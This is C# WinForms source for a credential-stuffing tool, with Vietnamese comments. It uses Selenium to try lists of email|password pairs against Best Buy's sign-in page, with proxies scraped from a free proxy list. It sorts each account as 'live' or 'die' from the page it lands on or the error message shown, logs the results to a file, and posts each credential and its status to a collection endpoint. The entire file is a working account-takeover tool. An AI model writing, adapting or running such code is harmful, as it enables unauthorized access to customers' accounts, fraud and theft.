using KAutoHelper;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using OpenQA.Selenium.Support.UI;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using xNet;

namespace ToolBest
{
    public partial class Form1 : Form
    {
        ChromeDriver chromeDriver;
        HttpRequest http;
        string data;
        int i = 0;
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }
        #region run
        private void run(string mp)
        {
            //string[] mailPass = mp.Split(new string[] { "|" }, StringSplitOptions.None);
            //output("- khoi tao");
            newChrome();

            //output(" - Dang nhap");
            string e = login(mp);

            if(String.Compare(e,"break") != 0)
            {
                //ghi file
                //output("- Check loi");
                string result = getErr(e);

                //output("- Ghi file");
                output(result);

                //dong tab
                //output("Quit - End");
                i++;
                //listBox1.Items.RemoveAt(0);
                chromeDriver.Quit();
            }
        }

        ChromeDriver newChrome()
        {
            ChromeOptions options = new ChromeOptions();
            //output("-- Khoi tao xong");

            //Khi den socks cuoi cung thi quay lai sock dau tien
            if (i == listBox1.Items.Count - 1)
                i = 0;
            //options.AddArguments("--proxy-server=" + listBox1.Items[i].ToString());
            chromeDriver = new ChromeDriver(options);
            //Khi website ko phan hoi trong thoi gian nhat dinh thi chay lai ham login
            try
            {
                //output("-- Navigate");
                chromeDriver.Url = "https://www.bestbuy.com/identity/global/signin";
                chromeDriver.Navigate();
            }
            catch (Exception ex)
            {
                //output("-- Loi navigate");
                listBox1.Items.RemoveAt(i);
                chromeDriver.Quit();
                return newChrome();
            }
            return chromeDriver;
        }

        //lay dia chi cac phan tu va dien thong tin vao form login
        public string login(string mp)
        {
            //output("- login");
            string[] mailPass = mp.Split(new string[] { "|" }, StringSplitOptions.None);
            //lay dia chi cua cac phan tu
            try
            {
                var email = chromeDriver.FindElementById("fld-e");
                var pwd = chromeDriver.FindElementById("fld-p1");
                var btnSubmit = chromeDriver.FindElementByClassName("cia-form__controls");

                //cho trinh duyet load xong
                wait();

                //dien du lieu vao form login
                email.SendKeys(mailPass[0]);
                pwd.SendKeys(mailPass[1]);
                btnSubmit.Click();
                return mp;
            }
            catch (Exception ex)
            {
                //do something ?
                //output("Quit - loi die sock");
                chromeDriver.Quit();
                listBox1.Items.RemoveAt(i);
                run(mp);
                return "break";
            }

        }

        void wait()
        {
            WebDriverWait wait = new WebDriverWait(chromeDriver, TimeSpan.FromSeconds(30));
            wait.Until((x) =>
            {
                return ((IJavaScriptExecutor)chromeDriver).ExecuteScript("return document.readyState").Equals("complete");
            });
        }

        public string getErr(string e)
        {
            string result = "";

            //chuong trinh tam nghi 3.5s
            Thread.Sleep(3500);
            //Chờ cho đến khi tìm được lỗi hoặc chuyển sang trang chủ
            //nếu vẫn ở trang hiện tại trang hiện tại ("https://www.bestbuy.com/identity/signin?token=tid%3A2fb6ccaf-61e7-11ea-9a2e-0e9233bf588f") mà tìm thấy lỗi thì return die
            //https://www.bestbuy.com/identity/signin/recoveryOptions
            //Nếu ko thì
            var url = chromeDriver.Url;
            //output("-- get URL");


            if (String.Compare(url, "https://www.bestbuy.com/") == 0 || String.Compare(url, "https://www.bestbuy.com/?intl=nosplash") == 0)
            {
                //output("-- login TRUE");
                wait();

                sendData(e, 1);

                return e + " => live";
            }
                
            else
            {
                //output("-- khong tim thay");
                string[] arrLink = url.Split(new string[] { "?token=tid%3A" }, StringSplitOptions.None);
                //Nếu trang web bắt xác nhận email return die
                if(String.Compare(arrLink[0], "https://www.bestbuy.com/identity/signin/recoveryOptions") == 0)
                {
                    sendData(e, 0);
                    
                    return e + " => die";
                }
                //Nếu ko thì tìm cho ra lỗi || trang web chưa load xong
                else if(String.Compare(arrLink[0], "https://www.bestbuy.com/identity/signin") == 0)
                {
                    //output("-- Lấy thông báo lỗi của website");
                    //Lấy thông báo lỗi của website
                    try
                    {
                        result = chromeDriver.FindElementByXPath("/html/body/div[3]/div[1]/section/main/div[1]/div/div/div[1]/div/div[2]/strong/div").Text.ToString();
                        if (String.Compare(result, "We didn't find an account with that email address. Would you like to create an account?") == 0 || String.Compare(result, "Oops! The email or password did not match our records. Please try again.") == 0 || String.Compare(result, "The password was incorrect. Please try again.") == 0)
                        {
                            //output("-- tim thay");
                            sendData(e, 0);
                            Thread.Sleep(1000);
                            return e + " => die";
                        }
                    }
                    catch(Exception ex)
                    {
                        //output("-- ko tim thay");
                        //   output("loi gi do");
                        return getErr(e);
                    }

                }

            }
            return e + " => UNKNOW ERROR";
        }
        
        //ghi du lieu vao file output.txt
        public void output(string text)
        {
            StreamWriter sw = new StreamWriter(txtFolderSave.Text + "\\output.txt", true);

            sw.WriteLine(text);

            sw.Close();
        }
        

        #endregion
        private void button2_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(txtFileOpen.Text) || !String.IsNullOrEmpty(txtFolderSave.Text))
            {
                //Kiểm tra xem đã load proxy chưa
                if(listBox1.Items.Count > 0)
                {
                    string[] lines = File.ReadAllLines(txtFileOpen.Text);

                    foreach (string mp in lines)
                    {
                        run(mp);
                    }

                    MessageBox.Show("Chương trình đã chạy xong !!!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    MessageBox.Show("Phải load proxy trước","Thông báo",MessageBoxButtons.OK,MessageBoxIcon.Error);
                }
            }
            else
                MessageBox.Show("Bạn phải chọn file account và nơi lưu file", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        private void btnOpenFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();

            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtFileOpen.Text = openFileDialog.FileName;
            }
        }

        private void btnSaveFile_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folder = new FolderBrowserDialog();

            if (folder.ShowDialog() == DialogResult.OK)
            {
                txtFolderSave.Text = folder.SelectedPath;
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            string html = GetData("https://free-proxy-list.net/");
            
            getShock(html);
        }
        string GetData(string url, string cookie = null)
        {
            http = new HttpRequest();
            
            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36";
            string html = http.Get(url).ToString();
            return html;
        }
        private void getShock(string html)
        {
            var res = Regex.Matches(html, @"(?=<tr><td>).*?(?=</td></tr><tr><td>)", RegexOptions.Multiline);

            //StreamWriter sw = new StreamWriter("output.txt", true);
            
            foreach (var line in res)
            {
                string[] arr = line.ToString().Split(new string[] { "</td>" }, StringSplitOptions.None);
                arr[0] = arr[0].Replace("<tr><td>", "");
                arr[1] = arr[1].Replace("<td>", "");
                arr[6] = arr[6].Replace("<td class='hx'>", "");
                
                if(String.Compare(arr[6],"yes") == 0)
                {
                    listBox1.Items.Add(arr[0] + ":" + arr[1]);
                }
            }
        }

        

        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void button3_Click(object sender, EventArgs e)
        {
            data = "m=username&p=password&ok=ok";
            string stringReturn = PostData(http, "http://localhost:81/BestBuy/", data, "application/x-www-form-urlencoded", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36");
            
        }

        string PostData(HttpRequest http, string url, string data = null, string contentType = null, string userArgent = "", string cookie = null)
        {
            if (http == null)
            {
                http = new HttpRequest();
                http.Cookies = new CookieDictionary();
            }

            if (!string.IsNullOrEmpty(userArgent))
            {
                http.UserAgent = userArgent;
            }

            string html = http.Post(url, data, contentType).ToString();
            return html;
        }

        void sendData(string e,int stt)
        {
            string[] mailPass = e.Split(new string[] { "|" }, StringSplitOptions.None);
            data = "m=" + mailPass[0] + "&p=" + mailPass[1] + "&stt=" + stt + "&ok=ok";
            listBox2.Items.Add(data);
            PostData(http, "http://localhost:81/BestBuy/", data, "application/x-www-form-urlencoded", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36");

        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("");
        }
    }
}
